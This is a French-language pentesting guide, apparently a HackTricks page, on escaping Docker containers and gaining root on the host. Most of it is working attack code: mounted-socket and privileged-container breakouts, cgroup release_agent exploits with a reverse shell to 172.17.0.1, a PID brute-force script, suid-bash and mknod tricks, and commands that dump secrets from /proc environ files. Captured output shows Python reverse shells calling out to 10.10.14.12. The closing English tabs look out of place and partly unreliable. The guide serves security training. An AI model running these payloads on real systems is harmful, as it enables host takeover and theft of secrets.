# Évasion de Docker / Élévation de privilèges

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Énumération et évasion automatiques

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) : Il peut également **énumérer les conteneurs**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery) : Cet outil est assez **utile pour énumérer le conteneur dans lequel vous vous trouvez et même essayer de s'échapper automatiquement**
* [**amicontained**](https://github.com/genuinetools/amicontained) : Outil utile pour obtenir les privilèges dont dispose le conteneur afin de trouver des moyens de s'en échapper
* [**deepce**](https://github.com/stealthcopter/deepce) : Outil pour énumérer et s'échapper des conteneurs
* [**grype**](https://github.com/anchore/grype) : Obtenez les CVE contenues dans le logiciel installé dans l'image

## Évasion de la socket Docker montée

Si vous trouvez que la **socket Docker est montée** à l'intérieur du conteneur Docker, vous pourrez vous en échapper.\
Cela se produit généralement dans les conteneurs Docker qui, pour une raison quelconque, doivent se connecter au démon Docker pour effectuer des actions.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Dans ce cas, vous pouvez utiliser les commandes docker régulières pour communiquer avec le démon docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Dans le cas où le **socket docker est dans un emplacement inattendu**, vous pouvez toujours communiquer avec lui en utilisant la commande **`docker`** avec le paramètre **`-H unix:///path/to/docker.sock`**
{% endhint %}

Le démon Docker peut également [écouter sur un port (par défaut 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou sur les systèmes basés sur Systemd, la communication avec le démon Docker peut se faire via le socket Systemd `fd://`.

{% hint style="info" %}
De plus, faites attention aux sockets d'exécution des autres runtimes de haut niveau :

* dockershim : `unix:///var/run/dockershim.sock`
* containerd : `unix:///run/containerd/containerd.sock`
* cri-o : `unix:///var/run/crio/crio.sock`
* frakti : `unix:///var/run/frakti.sock`
* rktlet : `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Évasion d'abus de capacités

Vous devez vérifier les capacités du conteneur, s'il possède l'une des capacités suivantes, vous pourriez être en mesure de vous échapper : **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Vous pouvez vérifier les capacités actuelles du conteneur en utilisant **les outils automatiques précédemment mentionnés** ou :
```bash
capsh --print
```
Sur la page suivante, vous pouvez **en savoir plus sur les capacités de Linux** et comment les abuser pour échapper/escalader les privilèges :

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Échapper des conteneurs privilégiés

Un conteneur privilégié peut être créé avec le drapeau `--privileged` ou en désactivant des défenses spécifiques :

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Le drapeau `--privileged` introduit des problèmes de sécurité importants, et l'exploit repose sur le lancement d'un conteneur Docker avec cette option activée. Lorsque ce drapeau est utilisé, les conteneurs ont un accès complet à tous les périphériques et ne sont pas restreints par seccomp, AppArmor et les capacités Linux. Vous pouvez **lire tous les effets de `--privileged`** sur cette page :

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Avec ces autorisations, vous pouvez simplement **passer à l'espace de noms d'un processus s'exécutant sur l'hôte en tant que root** comme init (pid:1) en exécutant simplement : `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testez-le dans un conteneur en exécutant :
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilégié

Avec le drapeau privilégié, vous pouvez essayer d'**accéder au disque de l'hôte** ou essayer de **s'échapper en abusant de release\_agent ou d'autres échappatoires**.

Testez les contournements suivants dans un conteneur en exécutant:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montage de disque - Poc1

Les conteneurs Docker bien configurés n'autorisent pas les commandes telles que **fdisk -l**. Cependant, sur une commande Docker mal configurée où le drapeau `--privileged` ou `--device=/dev/sda1` avec des majuscules est spécifié, il est possible d'obtenir les privilèges pour voir le disque hôte.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Ainsi, pour prendre le contrôle de la machine hôte, c'est trivial :
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Et voilà ! Vous pouvez maintenant accéder au système de fichiers de l'hôte car il est monté dans le dossier `/mnt/hola`.

#### Montage de disque - Poc2

Dans le conteneur, un attaquant peut tenter d'accéder davantage au système d'exploitation hôte sous-jacent via un volume hostPath inscriptible créé par le cluster. Voici quelques éléments courants que vous pouvez vérifier dans le conteneur pour voir si vous exploitez ce vecteur d'attaque :
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Évasion de privilèges en exploitant l'agent de sortie existant ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC initial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Évasion de privilèges en abusant de l'agent de sortie créé ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Deuxième PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Trouvez une **explication de la technique** dans:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Évasion de privilèges en exploitant release\_agent sans connaître le chemin relatif - PoC3

Dans les exploits précédents, le **chemin absolu du conteneur à l'intérieur du système de fichiers de l'hôte est divulgué**. Cependant, ce n'est pas toujours le cas. Dans les cas où vous **ne connaissez pas le chemin absolu du conteneur à l'intérieur de l'hôte**, vous pouvez utiliser cette technique:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
L'exécution du PoC dans un conteneur privilégié devrait fournir une sortie similaire à:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Évasion de privilèges en abusant des montages sensibles

Il existe plusieurs fichiers qui peuvent être montés et qui donnent **des informations sur l'hôte sous-jacent**. Certains d'entre eux peuvent même indiquer **quelque chose à exécuter par l'hôte lorsqu'il se passe quelque chose** (ce qui permettra à un attaquant de s'échapper du conteneur).\
L'abus de ces fichiers peut permettre que :

* release\_agent (déjà couvert auparavant)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Cependant, vous pouvez trouver **d'autres fichiers sensibles** à vérifier sur cette page :

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Montages arbitraires

À plusieurs occasions, vous constaterez que le **conteneur a un volume monté depuis l'hôte**. Si ce volume n'a pas été correctement configuré, vous pourrez peut-être **accéder/modifier des données sensibles** : lire des secrets, changer les clés autorisées ssh...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Élévation de privilèges avec 2 shells et un montage de l'hôte

Si vous avez accès en tant que **root à l'intérieur d'un conteneur** qui a un dossier de l'hôte monté et que vous avez **échappé en tant qu'utilisateur non privilégié vers l'hôte** et avez un accès en lecture sur le dossier monté.\
Vous pouvez créer un **fichier bash suid** dans le **dossier monté** à l'intérieur du **conteneur** et **l'exécuter depuis l'hôte** pour une élévation de privilèges.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Élévation de privilèges avec 2 shells

Si vous avez accès en tant que **root à l'intérieur d'un conteneur** et que vous avez **échappé en tant qu'utilisateur non privilégié vers l'hôte**, vous pouvez utiliser les deux shells pour **élever les privilèges à l'intérieur de l'hôte** si vous avez la capacité MKNOD à l'intérieur du conteneur (c'est par défaut) comme [**expliqué dans ce post**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Avec une telle capacité, l'utilisateur root à l'intérieur du conteneur est autorisé à **créer des fichiers de périphérique de bloc**. Les fichiers de périphérique sont des fichiers spéciaux qui sont utilisés pour **accéder au matériel sous-jacent et aux modules du noyau**. Par exemple, le fichier de périphérique de bloc /dev/sda donne accès à **lire les données brutes sur le disque du système**.

Docker veille à ce que les périphériques de bloc **ne puissent pas être utilisés de manière abusive à partir du conteneur** en définissant une politique cgroup sur le conteneur qui bloque la lecture et l'écriture des périphériques de bloc.\
Cependant, si un périphérique de bloc est **créé à l'intérieur du conteneur, il peut être accédé** via le dossier /proc/PID/root/ par quelqu'un **à l'extérieur du conteneur**, la limitation étant que le **processus doit être détenu par le même utilisateur** à l'extérieur et à l'intérieur du conteneur.

Exemple d'**exploitation** à partir de ce [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$ 
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Si vous pouvez accéder aux processus de l'hôte, vous pourrez accéder à de nombreuses informations sensibles stockées dans ces processus. Exécutez le laboratoire de test:
```
docker run --rm -it --pid=host ubuntu bash
```
Par exemple, vous pourrez lister les processus en utilisant quelque chose comme `ps auxn` et rechercher des détails sensibles dans les commandes.

Ensuite, comme vous pouvez **accéder à chaque processus de l'hôte dans /proc/, vous pouvez simplement voler leurs secrets d'environnement** en exécutant:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Vous pouvez également **accéder aux descripteurs de fichiers d'autres processus et lire leurs fichiers ouverts**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Vous pouvez également **arrêter des processus et causer un DoS**.

{% hint style="warning" %}
Si vous avez d'une manière ou d'une autre un **accès privilégié sur un processus en dehors du conteneur**, vous pouvez exécuter quelque chose comme `nsenter --target <pid> --all` ou `nsenter --target <pid> --mount --net --pid --cgroup` pour **exécuter un shell avec les mêmes restrictions ns** (espérons-le aucune) **que ce processus.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Si un conteneur est configuré avec le pilote de réseau Docker [host (`--network=host`)](https://docs.docker.com/network/host/), la pile réseau de ce conteneur n'est pas isolée de l'hôte Docker (le conteneur partage l'espace de noms réseau de l'hôte) et le conteneur ne reçoit pas sa propre adresse IP. En d'autres termes, **le conteneur lie tous les services directement à l'adresse IP de l'hôte**. De plus, le conteneur peut **intercepter TOUT le trafic réseau que l'hôte** envoie et reçoit sur l'interface partagée `tcpdump -i eth0`.

Par exemple, vous pouvez utiliser cela pour **sniffer et même falsifier le trafic** entre l'hôte et l'instance de métadonnées.

Comme dans les exemples suivants :

* [Writeup: Comment contacter Google SRE : Obtenir un shell dans Cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM permet une élévation de privilèges root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Vous pourrez également accéder aux **services réseau liés à localhost** à l'intérieur de l'hôte ou même accéder aux **permissions de métadonnées du nœud** (qui peuvent être différentes de celles qu'un conteneur peut accéder) :

{% content-ref url="../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/" %}
[broken-reference](../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/)
{% endcontent-ref %}

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
Si vous avez seulement `hostIPC=true`, vous ne pourrez probablement pas faire grand-chose. Si un processus sur l'hôte ou tout processus dans un autre pod utilise les **mécanismes de communication inter-processus** de l'hôte (mémoire partagée, tableaux de sémaphores, files de messages, etc.), vous pourrez lire/écrire sur ces mêmes mécanismes. Le premier endroit où vous voudrez regarder est `/dev/shm`, car il est partagé entre tous les pods avec `hostIPC=true` et l'hôte. Vous voudrez également vérifier les autres mécanismes IPC avec `ipcs`.

* **Inspecter /dev/shm** - Recherchez les fichiers dans cet emplacement de mémoire partagée : `ls -la /dev/shm`
* **Inspecter les installations IPC existantes** - Vous pouvez vérifier si des installations IPC sont utilisées avec `/usr/bin/ipcs`. Vérifiez-le avec : `ipcs -a`

### Récupérer les capacités

Si l'appel système **`unshare`** n'est pas interdit, vous pouvez récupérer toutes les capacités en exécutant :
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abus de l'espace de noms utilisateur via un lien symbolique

La deuxième technique expliquée dans l'article [https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indique comment vous pouvez abuser des montages liés avec des espaces de noms utilisateur, pour affecter les fichiers à l'intérieur de l'hôte (dans ce cas spécifique, supprimer des fichiers).

![](../../docker-breakout/.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Exploit Runc (CVE-2019-5736)

Dans le cas où vous pouvez exécuter `docker exec` en tant que root (probablement avec sudo), vous pouvez essayer d'escalader les privilèges en sortant d'un conteneur en abusant de CVE-2019-5736 (exploit [ici](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Cette technique va essentiellement **écraser** le binaire _**/bin/sh**_ de l'**hôte** **à partir d'un conteneur**, de sorte que toute personne exécutant docker exec peut déclencher la charge utile.

Modifiez la charge utile en conséquence et construisez main.go avec `go build main.go`. Le binaire résultant doit être placé dans le conteneur Docker pour l'exécution.\
Lors de l'exécution, dès qu'il affiche `[+] Overwritten /bin/sh successfully`, vous devez exécuter ce qui suit depuis la machine hôte :

`docker exec -it <container-name> /bin/sh`

Cela déclenchera la charge utile qui est présente dans le fichier main.go.

Pour plus d'informations : [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Il existe d'autres CVE auxquels le conteneur peut être vulnérable, vous pouvez trouver une liste dans [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Évasion personnalisée de Docker

### Surface d'évasion Docker

* **Espaces de noms:** Le processus doit être **complètement séparé des autres processus** via des espaces de noms, donc nous ne pouvons pas échapper à l'interaction avec d'autres processus en raison des espaces de noms (par défaut, ne peut pas communiquer via IPC, sockets Unix, services réseau, D-Bus, `/proc` d'autres processus).
* **Utilisateur root**: Par défaut, l'utilisateur exécutant le processus est l'utilisateur root (mais ses privilèges sont limités).
* **Capacités**: Docker laisse les capacités suivantes : `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Appels système**: Ce sont les appels système que l'**utilisateur root ne pourra pas appeler** (en raison du manque de capacités + Seccomp). Les autres appels système pourraient être utilisés pour essayer de s'échapper.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="AppArmor" %}

## AppArmor

AppArmor is a Linux security module that provides Mandatory Access Control (MAC) for programs. It is similar to SELinux but with a simpler syntax. AppArmor profiles can be used to restrict the actions that a container can perform.

### AppArmor profile for Docker

By default, Docker uses a default AppArmor profile that restricts the actions that a container can perform. However, this profile can be overridden by a custom profile.

To create a custom AppArmor profile for Docker, follow these steps:

1. Create a new profile file in `/etc/apparmor.d/docker-custom` with the following contents:

   ```
   #include <tunables/global>

   profile docker-custom flags=(attach_disconnected,mediate_deleted) {
     #include <abstractions/base>
     #include <docker>
   }
   ```

2. Reload the AppArmor profiles:

   ```
   $ sudo apparmor_parser -r /etc/apparmor.d/docker-custom
   ```

3. Start a container with the custom profile:

   ```
   $ docker run --security-opt apparmor=docker-custom -it ubuntu /bin/bash
   ```

   This will start a new container with the custom AppArmor profile.

### AppArmor profile for Kubernetes

Kubernetes also supports AppArmor profiles for restricting the actions that a container can perform. To create a custom AppArmor profile for Kubernetes, follow these steps:

1. Create a new profile file in `/etc/apparmor.d/kubernetes-custom` with the following contents:

   ```
   #include <tunables/global>

   profile kubernetes-custom flags=(attach_disconnected,mediate_deleted) {
     #include <abstractions/base>
     #include <kubernetes>
   }
   ```

2. Reload the AppArmor profiles:

   ```
   $ sudo apparmor_parser -r /etc/apparmor.d/kubernetes-custom
   ```

3. Add the custom profile to the Kubernetes pod specification:

   ```
   apiVersion: v1
   kind: Pod
   metadata:
     name: my-pod
   spec:
     containers:
     - name: my-container
       image: ubuntu
       securityContext:
         appArmor:
           profile: kubernetes-custom
       command: ["/bin/bash"]
       args: ["-c", "sleep 1000000"]
   ```

   This will start a new pod with the custom AppArmor profile.

## References

- [AppArmor](https://wiki.ubuntu.com/AppArmor)
- [Docker security](https://docs.docker.com/engine/security/)
- [Kubernetes security](https://kubernetes.io/docs/concepts/security/)
- [AppArmor profile for Docker](https://docs.docker.com/engine/security/apparmor/)
- [AppArmor profile for Kubernetes](https://kubernetes.io/docs/tutorials/clusters/apparmor/)
{% endtab %}

{% tab title="Capabilities" %}

## Capabilities

Linux capabilities are a way to give a process some privileges without giving it full root privileges. Capabilities can be used to restrict the actions that a container can perform.

### Capabilities in Docker

By default, Docker drops all capabilities except for a few that are needed for the container to function. However, it is possible to add or remove capabilities from a container.

To add capabilities to a container, use the `--cap-add` flag:

```
$ docker run --cap-add=SYS_ADMIN -it ubuntu /bin/bash
```

This will start a new container with the `SYS_ADMIN` capability.

To remove capabilities from a container, use the `--cap-drop` flag:

```
$ docker run --cap-drop=NET_ADMIN -it ubuntu /bin/bash
```

This will start a new container without the `NET_ADMIN` capability.

### Capabilities in Kubernetes

Kubernetes also supports capabilities for restricting the actions that a container can perform. To add or remove capabilities from a container in Kubernetes, use the `securityContext` field in the pod specification:

```
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  containers:
  - name: my-container
    image: ubuntu
    securityContext:
      capabilities:
        add: ["SYS_ADMIN"]
        drop: ["NET_ADMIN"]
    command: ["/bin/bash"]
    args: ["-c", "sleep 1000000"]
```

This will start a new pod with the `SYS_ADMIN` capability added and the `NET_ADMIN` capability dropped.

## References

- [Linux capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Docker security](https://docs.docker.com/engine/security/)
- [Kubernetes security](https://kubernetes.io/docs/concepts/security/)
- [Capabilities in Docker](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)
